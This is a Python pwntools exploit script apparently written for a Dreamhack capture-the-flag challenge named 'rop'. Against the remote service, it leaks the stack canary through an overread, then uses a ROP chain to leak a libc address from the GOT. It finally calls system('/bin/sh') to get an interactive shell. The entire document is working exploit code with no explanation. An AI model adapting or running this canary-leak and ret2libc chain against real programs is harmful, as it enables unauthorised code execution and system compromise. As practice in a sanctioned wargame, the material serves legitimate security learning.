from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games",10927)
e = ELF("./rop")
libc = ELF("./libc-2.27.so")
r = ROP(e)

# [1] Leak Canary
buf = b'A'*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)


# [2] 
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
main = e.symbols['main']

payload = b'A'*0x38 + p64(canary) + b'B'*0x8
payload += p64(pop_rdi) + p64(read_got) 
payload += p64(puts_plt)    
payload += p64(main)

p.sendafter("Buf: ", payload)   
read = u64(p.recvn(6) + b"\x00"*2)       
lb = read - libc.symbols["read"]        
system = lb + libc.symbols["system"]    
binsh = lb + list(libc.search(b"/bin/sh"))[0]

buf = b'A'*0x38
p.sendafter("Buf: ", buf)

payload2 = b'A'*0x38 + p64(canary) + b'B'*0x8
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(system)
p.sendafter("Buf: ", payload2)   

p.interactive()
